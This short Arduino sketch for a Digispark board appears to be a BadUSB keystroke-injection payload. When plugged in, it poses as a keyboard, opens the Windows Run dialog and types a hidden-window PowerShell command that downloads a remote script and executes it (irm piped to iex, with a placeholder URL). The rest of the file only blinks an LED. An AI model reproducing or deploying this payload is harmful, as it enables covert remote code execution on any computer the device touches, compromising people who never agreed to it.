// #define LAYOUT_GERMAN
#include "DigiKeyboard.h"

void setup()
{
    pinMode(1, OUTPUT);
    DigiKeyboard.sendKeyStroke(0);

    // open run box
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(250);

    // run command
    DigiKeyboard.println("powershell -W H -c \"irm https://script.ps1 | iex\"");
}

void loop()
{
    digitalWrite(1, HIGH);
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
}